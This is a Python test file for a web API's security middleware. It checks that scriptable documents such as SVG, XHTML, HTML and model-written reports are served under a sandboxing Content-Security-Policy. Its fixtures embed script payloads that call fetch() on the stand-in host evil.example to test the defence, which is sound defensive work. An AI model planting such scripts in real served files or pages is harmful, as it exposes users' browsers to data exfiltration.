"""Anything a browser can navigate to on this API leaves sandboxed — decided once, not per route.

The sandbox CSP was attached by each file route under `if media.startswith("text/html")`, so the two
other scriptable documents the library happily stores went out bare: `.svg` is image/svg+xml and
`.xhtml` is application/xhtml+xml, both run script when navigated top-level (the Files panel's "New
tab" does exactly that), and without the CSP there was no `connect-src 'none'` to stop the script from
posting what it read. `/api/session/{id}/report`, model-authored HTML, had no header at all. These
tests pin the rule where it now lives — core.http_security, one middleware — including the property the
per-call-site version could never have: a route nobody has written yet is covered too.
"""
from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

import kotoba.server as main
from kotoba.core import http_security


@pytest.fixture
def lib(tmp_path, monkeypatch):
    d = tmp_path / "files"
    d.mkdir()
    monkeypatch.setenv("KOTOBA_FILES_DIR", str(d))
    (d / "evil.svg").write_text(
        "<svg xmlns='http://www.w3.org/2000/svg'><script>fetch('https://evil.example/')</script></svg>",
        encoding="utf-8")
    (d / "evil.xhtml").write_text(
        "<html xmlns='http://www.w3.org/1999/xhtml'><script>1</script></html>", encoding="utf-8")
    (d / "page.html").write_text("<h1>hi</h1>", encoding="utf-8")
    (d / "style.css").write_text("body{}", encoding="utf-8")
    (d / "notes.txt").write_text("plain", encoding="utf-8")
    return d


@pytest.fixture
def client():
    with TestClient(main.app) as c:
        yield c


SANDBOXED = ["evil.svg", "evil.xhtml", "page.html", "notes.txt"]


@pytest.mark.parametrize("name", SANDBOXED)
def test_a_scriptable_file_is_sandboxed_on_the_raw_route(client, lib, name):
    r = client.get(f"/api/files/raw/{name}")
    assert r.status_code == 200
    csp = r.headers.get("content-security-policy", "")
    assert "sandbox allow-scripts" in csp and "allow-same-origin" not in csp
    assert "connect-src 'none'" in csp, "the exfiltration channel is what the sandbox is for"


@pytest.mark.parametrize("name", SANDBOXED)
def test_a_scriptable_file_is_sandboxed_on_the_open_route(client, lib, name):
    r = client.get("/api/files/open", params={"path": name})
    assert r.status_code == 200
    assert "sandbox allow-scripts" in r.headers.get("content-security-policy", "")


def test_the_svg_still_arrives_as_an_image(client, lib):
    """The panel previews it with <img>, and CSP is ignored for subresources — so the media type must
    stay itself. Serving it as octet-stream (what the visual-memory route does, where nothing but <img>
    ever asks) would blank every SVG in the Files panel."""
    r = client.get("/api/files/raw/evil.svg")
    assert r.headers["content-type"].startswith("image/svg+xml")


def test_a_subresource_is_not_sandboxed(client, lib):
    r = client.get("/api/files/raw/style.css")
    assert r.status_code == 200
    assert "sandbox" not in r.headers.get("content-security-policy", "")


@pytest.mark.parametrize("name", ["page.html", "evil.svg", "style.css"])
def test_every_library_response_refuses_sniffing(client, lib, name):
    assert client.get(f"/api/files/raw/{name}").headers.get("x-content-type-options") == "nosniff"


def test_the_report_carries_its_headers(client):
    from kotoba.core import reports

    reports.set_report("sess-hdr", "<h1>r</h1><script>fetch('https://evil.example/')</script>")
    r = client.get("/api/session/sess-hdr/report")
    assert r.status_code == 200
    assert "sandbox allow-scripts" in r.headers.get("content-security-policy", "")
    assert r.headers.get("x-content-type-options") == "nosniff"
    assert r.headers.get("x-frame-options") == "DENY"


def test_swagger_keeps_its_cdn(client):
    """The one exemption: /docs is OUR page and loads its script from a CDN that script-src 'self'
    would block. It still refuses sniffing."""
    r = client.get("/docs")
    assert r.status_code == 200
    assert "sandbox" not in r.headers.get("content-security-policy", "")
    assert r.headers.get("x-content-type-options") == "nosniff"


# --- the rule itself, without HTTP -------------------------------------------------------------------

@pytest.mark.parametrize("media,document", [
    ("text/html; charset=utf-8", True),
    ("application/xhtml+xml", True),
    ("image/svg+xml", True),
    ("message/rfc822", True),          # .mhtml — Chrome renders it as a document
    ("application/xml", True),
    ("text/plain; charset=utf-8", True),   # the fallback for an unknown extension
    ("application/octet-stream", True),
    ("", True),                        # no content type at all → deny by default
    ("image/png", False),
    ("image/x-icon", False),
    ("text/css", False),
    ("text/javascript", False),
    ("application/json", False),
    ("application/pdf", False),
    ("text/event-stream", False),
    ("font/woff2", False),
    ("video/mp4", False),
])
def test_what_counts_as_a_document(media, document):
    assert http_security.is_document(media) is document


def test_an_existing_policy_is_never_overwritten():
    headers = [(b"content-type", b"text/html"), (b"content-security-policy", b"default-src 'none'")]
    out = http_security.harden(headers)
    assert [v for k, v in out if k == b"content-security-policy"] == [b"default-src 'none'"]


def test_a_route_that_does_not_exist_yet_is_covered():
    """The property the per-call-site version could not have. A brand-new app, one HTML route that
    never heard of any of this, wrapped in the middleware."""
    from starlette.applications import Starlette
    from starlette.responses import HTMLResponse
    from starlette.routing import Route

    app = Starlette(routes=[Route("/brand-new", lambda req: HTMLResponse("<b>x</b>"))])
    app.add_middleware(http_security.DocumentSecurityMiddleware)
    with TestClient(app) as c:
        r = c.get("/brand-new")
    assert "sandbox allow-scripts" in r.headers.get("content-security-policy", "")
    assert r.headers.get("x-content-type-options") == "nosniff"


def test_the_event_stream_is_left_alone():
    from starlette.applications import Starlette
    from starlette.responses import StreamingResponse
    from starlette.routing import Route

    async def stream(_req):
        async def gen():
            yield b"data: 1\n\n"
        return StreamingResponse(gen(), media_type="text/event-stream")

    app = Starlette(routes=[Route("/sse", stream)])
    app.add_middleware(http_security.DocumentSecurityMiddleware)
    with TestClient(app) as c:
        r = c.get("/sse")
    assert r.status_code == 200 and r.text == "data: 1\n\n"
    assert "content-security-policy" not in {k.lower() for k in r.headers}
